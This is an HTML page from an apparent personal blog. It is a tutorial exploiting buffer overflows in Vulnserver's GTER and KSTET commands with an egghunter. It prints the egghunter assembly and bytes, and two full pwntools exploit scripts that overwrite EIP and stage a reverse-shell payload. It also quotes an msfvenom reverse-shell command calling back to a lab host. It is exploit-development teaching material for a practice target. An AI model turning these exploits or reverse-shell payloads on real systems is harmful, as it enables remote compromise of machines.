@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta content="IE=edge" http-equiv="X-UA-Compatible" />
+<meta content="text/html; charset=UTF-8" http-equiv="content-type" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+<meta name="robots" content="index, follow">
+
+
+
+
+
+
+
+
+
+
+<title>Vulnserver: Egghunter in GTER and KSTET after buffer overflow</title>
+
+
+
+<meta name="title" content="Vulnserver: Egghunter in GTER and KSTET after buffer overflow">
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://guas.ch/blog/vulnserver4-gter-kstet/">
+
+<meta property="og:site_name" content="">
+
+
+<meta property="og:title" content="Vulnserver: Egghunter in GTER and KSTET after buffer overflow">
+
+
+
+
+
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="https://guas.ch/blog/vulnserver4-gter-kstet/">
+
+<meta property="twitter:title" content="Vulnserver: Egghunter in GTER and KSTET after buffer overflow">
+
+
+
+
+<link rel="canonical" href="https://guas.ch/blog/vulnserver4-gter-kstet/">
+
+
+
+
+<link rel="alternate" type="application/atom+xml" title="RSS" href="https://guas.ch/atom.xml"> 
+
+
+
+<link rel="stylesheet" href="https://guas.ch/css/style.css" />
+
+<script defer>
+    const setTheme = (theme) => {
+        document.documentElement.className = theme;
+        localStorage.setItem('theme', theme);
+    }
+
+    const hasCodeRun = localStorage.getItem('hasCodeRun');
+
+    if (!hasCodeRun) {
+        const defaultTheme = "light";
+        setTheme(defaultTheme);
+        localStorage.setItem('hasCodeRun', 'true');
+    }
+
+    const getTheme = () => {
+        const theme = localStorage.getItem('theme');
+        if (theme) {
+            setTheme(theme);
+        }
+    }
+
+    getTheme();
+
+</script>
+</head>
+<body>
+    <div class="wrapper">
+      <header>
+          
+
+  
+
+
+  <nav class="navBar">
+    
+      <a href="&#x2F;" class="">
+        
+        &#x2F;whoami&#x2F;
+      </a>
+    
+      <a href="&#x2F;blog" class="">
+        
+        &#x2F;blog&#x2F;
+      </a>
+    
+
+  <div class="themeSwitch">
+    
+    <button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"> <use href="https://guas.ch/icons.svg#lightMode"></use></svg></button>
+    <button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#darkMode"></use></svg></button>
+
+    
+  </div>
+</nav>
+
+
+      </header>
+      <main>
+          
+<div><a href="..">..</a>/<span class="metaData">vulnserver4-gter-kstet</span></div>
+<time datetime="2019-11-07">Published on: <span class="metaData">2019-11-07</span></time>
+
+<h1>Vulnserver: Egghunter in GTER and KSTET after buffer overflow</h1>
+
+
+
+<p>In this post we are going to exploit a buffer overflow in both commands, GTER and KSTET, since the exploits are very similar I'm covering them both in the same post. We are going to use a new technique called an egghunter that will allow us to exploit targets that don't give us enough length in the initial payload to put our shellcode.<!--more--></p>
+<h2 id="analyzing-the-crash">Analyzing the crash</h2>
+<h3 id="kstet-command">KSTET command</h3>
+<p>First let's analyze the KSTET command, if we look at the stack after the crash we should notice that there is not much space to work with. We have around 60 bytes before overwriting EIP and only 20 after it, that's clearly not enough for our shellcode that takes more than 300 bytes. </p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg1.PNG">
+    <img src="img&#x2F;immunitydbg1.PNG" >
+  </a>
+  
+</div>
+<p>The first solution that comes to mind is using an egghunter and now you should be asking yourself what's that and the explanation is pretty simple. An egghunter is a very small shellcode that goes through all the memory of the program looking for a tag, 4 bytes of our choosing repeated two times, and once it finds that tag it jumps to the code after it.</p>
+<p>Below we can find an egghunter shellcode obtained from a post by Security Sift in the following <a href="http://www.securitysift.com/windows-exploit-development-part-5-locating-shellcode-egghunting/">link</a>. If you want a better explanation of how it works go to that post, a good understanding of x86 Assembly helps a lot to comprehend how it works.</p>
+<pre data-lang="nasm" style="background-color:#2b303b;color:#c0c5ce;" class="language-nasm "><code class="language-nasm" data-lang="nasm"><span style="color:#8fa1b3;">entry:
+</span><span style="color:#8fa1b3;">loop_inc_page:
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">or    </span><span style="color:#bf616a;">dx</span><span>, </span><span style="color:#d08770;">0x0fff</span><span style="color:#65737e;">       ; loop through memory pages by adding 4095 decimal or 
+</span><span style="color:#65737e;">                            ; PAGE_SIZE-1 to edx
+</span><span style="color:#8fa1b3;"> 
+</span><span style="color:#8fa1b3;"> loop_inc_one:
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">inc   </span><span style="color:#bf616a;">edx</span><span style="color:#65737e;">              ; loop through addresses in the memory page one by one
+</span><span style="color:#8fa1b3;"> 
+</span><span style="color:#8fa1b3;"> make_syscall:
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">push  </span><span style="color:#bf616a;">edx</span><span style="color:#65737e;">              ; push edx value (current address) onto the stack to save for 
+</span><span style="color:#65737e;">                            ; future reference
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">push  </span><span style="color:#d08770;">0x43</span><span style="color:#65737e;">             ; push 0x43 (the Syscall ID for NtDisplayString) onto the stack
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">pop   </span><span style="color:#bf616a;">eax</span><span style="color:#65737e;">              ; pop 0x43 into eax to use as the parameter to syscall
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">int   </span><span style="color:#d08770;">0x2e</span><span style="color:#65737e;">             ; issue the interrupt to call NtDisplayString kernel function
+</span><span style="color:#8fa1b3;"> 
+</span><span style="color:#8fa1b3;"> check_is_valid:
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">cmp   </span><span style="color:#bf616a;">al</span><span>, </span><span style="color:#d08770;">0x05</span><span style="color:#65737e;">         ; compare low order byte of eax to 0x5 (5 = access violation)
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">pop   </span><span style="color:#bf616a;">edx</span><span style="color:#65737e;">              ; restore edx from the stack
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">jz    </span><span style="color:#8fa1b3;">loop_inc_page</span><span style="color:#65737e;">    ; if the zf flag was set by cmp instruction there was an access 
+</span><span style="color:#65737e;">                            ; violation
+</span><span style="color:#65737e;">                            ; and the address was invalid so jmp back to loop_inc_page
+</span><span style="color:#8fa1b3;"> is_egg:
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">mov   </span><span style="color:#bf616a;">eax</span><span>, </span><span style="color:#d08770;">0x444e5750</span><span style="color:#65737e;">  ; if the address was valid, move the egg into eax for comparison
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">mov   </span><span style="color:#bf616a;">edi</span><span>, </span><span style="color:#bf616a;">edx</span><span style="color:#65737e;">         ; set edi to the current address pointer in edx for use in the 
+</span><span style="color:#65737e;">                            ; scasd instruction
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">scasd</span><span style="color:#65737e;">                  ; compares value in eax to dword value addressed by edi (current
+</span><span style="color:#65737e;">                            ; address pointer) and sets EFLAGS register accordingly after  
+</span><span style="color:#65737e;">                            ; scasd comparison, EDI is automatically incremented by 4 if DF 
+</span><span style="color:#65737e;">                            ; flag is 0 or decremented if flag is 1 
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">jnz   </span><span style="color:#8fa1b3;">loop_inc_one</span><span style="color:#65737e;">     ; egg not found? jump back to loop_inc_one
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">scasd</span><span style="color:#65737e;">                  ; first 4 bytes of egg found compare the dword in edi to 
+</span><span style="color:#65737e;">                            ; eax again (remember scasd automatically advanced by 4)
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">jnz   </span><span style="color:#8fa1b3;">loop_inc_one</span><span style="color:#65737e;">     ; only the first half of the egg was found 
+</span><span style="color:#65737e;">                            ; jump back to loop_inc_one  
+</span><span style="color:#8fa1b3;"> 
+</span><span style="color:#8fa1b3;"> found:
+</span><span style="color:#8fa1b3;">     </span><span style="color:#b48ead;">jmp   </span><span style="color:#bf616a;">edi</span><span style="color:#65737e;">              ;egg found! thanks to scasd, edi now points to shellcode
+</span></code></pre>
+<p>Now that we have our egghunter shellcode we should look for a way to send our reverse shell shellcode into the memory of the program. One possibility is simply sending the shellcode as part of another command, so let's test that with the following python code.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;"># Important to use different sockets because socket re-use truncated our shellcode
+</span><span>io1 = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io1.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io1.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">KSTAN </span><span>&quot;+ &quot;</span><span style="color:#a3be8c;">GschGsch</span><span>&quot; + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot;*</span><span style="color:#d08770;">350</span><span>)
+</span><span>io1.</span><span style="color:#bf616a;">close</span><span>() </span><span style="color:#65737e;"># Close the socket so we use a different socket for our egghunter
+</span></code></pre>
+<p>To check if it worked we can go to the Memory map window in Immunity Debugger and search for our tag &quot;GschGsch&quot;, after trial and error we found that it worked with the KSTAN command giving us more than enough size to put our reverse shell shellcode.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg2.PNG">
+    <img src="img&#x2F;immunitydbg2.PNG" >
+  </a>
+  
+</div>
+<p>So now we have all the pieces we needed to exploit the KSTET command.</p>
+<h3 id="gter-command">GTER command</h3>
+<p>For the GTER command we don't need much more work, if we look at the stack after the crash we see that we have around 150 bytes before overwriting EIP and 20 bytes after. Again that's not enough space for our shellcode so we are going to use the same egghunter technique as in KSTET, the only difference is going to be the offset when overwriting EIP.</p>
+<div class="textCenter">
+  <a class="lightbox" href="img&#x2F;immunitydbg3.PNG">
+    <img src="img&#x2F;immunitydbg3.PNG" >
+  </a>
+  
+</div>
+<p>So now let's jump into exploiting the commands.</p>
+<h2 id="exploiting">Exploiting</h2>
+<h3 id="kstet-command-1">KSTET command</h3>
+<p>First of all we need to generate the shellcode from the assembly of our egghunter, to do that we are going to use the <a href="https://www.nasm.us/">NASM</a> and a simple python script I created. If we give the name of the file containing the x86 Assembly code to our python script it will print the shellcode. As a note I modified the egghunter code so that it looks for the tag &quot;GschGsch&quot; instead of &quot;PWNDPWND&quot;.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>os
+</span><span style="color:#b48ead;">import </span><span>sys
+</span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span>(sys.argv) != </span><span style="color:#d08770;">2 </span><span>:
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">Usage: </span><span>&quot;+sys.argv[</span><span style="color:#d08770;">0</span><span>]+&quot;</span><span style="color:#a3be8c;"> &lt;file.asm&gt;.</span><span>&quot;
+</span><span>    sys.</span><span style="color:#bf616a;">exit</span><span>()
+</span><span>
+</span><span>cmd = &quot;</span><span style="color:#a3be8c;">nasm -fbin -o shellcode.bin </span><span>&quot; +sys.argv[</span><span style="color:#d08770;">1</span><span>]
+</span><span>exit_status = os.</span><span style="color:#bf616a;">system</span><span>(cmd)
+</span><span style="color:#b48ead;">if </span><span>exit_status != </span><span style="color:#d08770;">0</span><span>:
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&quot;</span><span style="color:#a3be8c;">[!] Error executing nasm.</span><span>&quot;
+</span><span>    sys.</span><span style="color:#bf616a;">exit</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&quot;</span><span style="color:#a3be8c;">shellcode.bin</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>f: 
+</span><span>    code = f.</span><span style="color:#bf616a;">read</span><span>()
+</span><span>    </span><span style="color:#b48ead;">print </span><span>&#39;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">x</span><span>&#39;+&#39;</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">x</span><span>&#39;.</span><span style="color:#bf616a;">join</span><span>(x.</span><span style="color:#bf616a;">encode</span><span>(&#39;</span><span style="color:#a3be8c;">hex</span><span>&#39;) </span><span style="color:#b48ead;">for </span><span>x </span><span style="color:#b48ead;">in </span><span>code)
+</span><span>
+</span><span>os.</span><span style="color:#bf616a;">remove</span><span>(&quot;</span><span style="color:#a3be8c;">shellcode.bin</span><span>&quot;)
+</span></code></pre>
+<p>Now that we have the egghunter shellcode we can see that it's 32 bytes long so we don't have enough space after EIP to put it there. A simply solution is to put a short shellcode that jumps to the 60 bytes we had before our EIP and put our egghunter there. We can use the assembly instruction &quot;jmp -50&quot; or &quot;\xeb\xcc&quot; to do exactly that, if we put it all together we obtain the following script.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># IP and port of the target (Vulnserver).
+</span><span>ip = &quot;</span><span style="color:#a3be8c;">10.0.2.15</span><span>&quot;
+</span><span>port = </span><span style="color:#d08770;">9999
+</span><span>
+</span><span>cmd = &quot;</span><span style="color:#a3be8c;">KSTET /.:/</span><span>&quot;
+</span><span style="color:#65737e;"># cyclic -l 0x61616174
+</span><span>offset_eip = </span><span style="color:#d08770;">76
+</span><span>eip = </span><span style="color:#d08770;">0x625011af </span><span style="color:#65737e;"># Address of instruction we want to run (jmp esp).
+</span><span>
+</span><span style="color:#65737e;"># Here we put the shellcode we want to execute.
+</span><span>offset_sc = offset_eip + </span><span style="color:#d08770;">4
+</span><span>shellcode = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\xeb\xcc</span><span>&quot; </span><span style="color:#65737e;"># jmp -50
+</span><span>
+</span><span style="color:#65737e;"># Here we put our egghunter (TAG=&quot;Gsch&quot;).
+</span><span>offset_egg = offset_eip - </span><span style="color:#d08770;">50
+</span><span>egg = (</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x90</span><span>&quot;*</span><span style="color:#d08770;">8 </span><span>+ </span><span style="color:#65737e;"># less padding because stack was overwritting egghunter from below
+</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58\xcd\x2e\x3c\x05\x5a</span><span>&quot;
+</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x74\xef\xb8\x47\x73\x63\x68\x89\xd7\xaf\x75\xea\xaf\x75\xe7</span><span>&quot;
+</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\xff\xe7</span><span>&quot;)
+</span><span>
+</span><span style="color:#65737e;"># Here we add our shellcode and prepend the tag so that egghunter finds it.
+</span><span style="color:#65737e;"># msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 EXITFUNC=thread -f c -b &quot;\x00\x0a&quot;
+</span><span>tag_shellcode = (</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">GschGsch</span><span>&quot; + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\xdb\xc1\xbe\xd6</span><span style="color:#a3be8c;">...</span><span>&quot;)
+</span><span>
+</span><span style="color:#65737e;"># Create our payload.
+</span><span>payload = </span><span style="color:#bf616a;">fit</span><span>({
+</span><span>    </span><span style="color:#d08770;">0</span><span>:cmd,
+</span><span>    offset_egg:egg,
+</span><span>    offset_eip:eip,
+</span><span>    offset_sc:shellcode,
+</span><span>    },</span><span style="color:#bf616a;">length</span><span>=</span><span style="color:#d08770;">200</span><span>)
+</span><span>
+</span><span style="color:#65737e;"># Important to use different sockets because socket re-use truncated our shellcode
+</span><span>io1 = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io1.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io1.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">KSTAN </span><span>&quot;+ tag_shellcode)
+</span><span>io1.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span>io = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>The only thing left is to listen on port 4444 with netcat, execute our script and get our shell. And it works like a charm!</p>
+<h2 id="gter-command-1">GTER command</h2>
+<p>For this commands the steps are exactly the same as for KSTET, we also only have 20 bytes after EIP but we have around 150 bytes before it so we can use a &quot;jmp -100&quot; or &quot;\xeb\x9a&quot; to get to our egghunter. Instead of repeating myself I'm simply going to post how the script looks.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># IP and port of the target (Vulnserver).
+</span><span>ip = &quot;</span><span style="color:#a3be8c;">10.0.2.15</span><span>&quot;
+</span><span>port = </span><span style="color:#d08770;">9999
+</span><span>
+</span><span>cmd= </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">GTER </span><span>&quot;
+</span><span style="color:#65737e;"># cyclic -l 0x6261616F
+</span><span>offset_eip = </span><span style="color:#d08770;">156 
+</span><span>eip = </span><span style="color:#d08770;">0x625011af </span><span style="color:#65737e;"># Address of instruction we want to run (jmp esp).
+</span><span>
+</span><span style="color:#65737e;"># Here we put the shellcode we want to execute.
+</span><span>offset_sc1 = offset_eip + </span><span style="color:#d08770;">4
+</span><span>sc1 = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\xEB\x9A</span><span>&quot; </span><span style="color:#65737e;"># jmp -100
+</span><span>
+</span><span style="color:#65737e;"># Here we put our egghunter (TAG=&quot;Gsch&quot;).
+</span><span>offset_egg = offset_eip - </span><span style="color:#d08770;">100
+</span><span>egg = (</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x90</span><span>&quot;*</span><span style="color:#d08770;">16 </span><span>+
+</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58\xcd\x2e\x3c\x05\x5a</span><span>&quot;
+</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x74\xef\xb8\x47\x73\x63\x68\x89\xd7\xaf\x75\xea\xaf\x75\xe7</span><span>&quot;
+</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\xff\xe7</span><span>&quot;)
+</span><span>
+</span><span style="color:#65737e;"># Here we add our shellcode and prepend the tag so that egghunter finds it.
+</span><span style="color:#65737e;"># msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 EXITFUNC=thread -f c -b &quot;\x00\x0a&quot;
+</span><span>sc2 = (</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">GschGsch</span><span>&quot; + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\xdb\xc1\xbe\xd6</span><span style="color:#a3be8c;">...</span><span>&quot;)
+</span><span>
+</span><span style="color:#65737e;"># Create our payload.
+</span><span>payload = </span><span style="color:#bf616a;">fit</span><span>({
+</span><span>    </span><span style="color:#d08770;">0</span><span>:cmd,
+</span><span>    offset_egg:egg,
+</span><span>    offset_eip:eip,
+</span><span>    offset_sc1:sc1,
+</span><span>    },</span><span style="color:#bf616a;">length</span><span>=</span><span style="color:#d08770;">200</span><span>)
+</span><span>
+</span><span style="color:#65737e;"># Important to use different sockets because socket re-use truncated our shellcode
+</span><span>io1 = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io1.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io1.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">KSTAN </span><span>&quot;+ sc2)
+</span><span>io1.</span><span style="color:#bf616a;">close</span><span>()
+</span><span>
+</span><span>io2 = </span><span style="color:#bf616a;">remote</span><span>(ip,port)
+</span><span>io2.</span><span style="color:#bf616a;">readline</span><span>()
+</span><span>io2.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>And that's it folks, we exploited both commands with almost idential scripts.</p>
+<p>See you in the next post :).</p>
+
+
+<p class="tagsData">
+  
+</p>
+
+      </main>
+      <footer>
+          <hr>
+<div class=footContainer>
+  <div class="footLeft">
+      Built with <a target="_blank" rel="noopener noreferrer" href="https://www.getzola.org">Zola</a> using <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/anemone">anemone</a> theme &amp; <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/veqev">veqev</a> colors.<br>
+    </p>
+  </div>
+  
+  <div class="footRight">
+    <a class="icons__background" target="_blank" rel="noopener noreferrer" href="https://guas.ch/atom.xml" title="Subscribe via RSS for updates."><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#rss"></use></svg></a>
+  </div>
+  
+</div>
+      </footer>
+    </div>
+</body>
+</html>
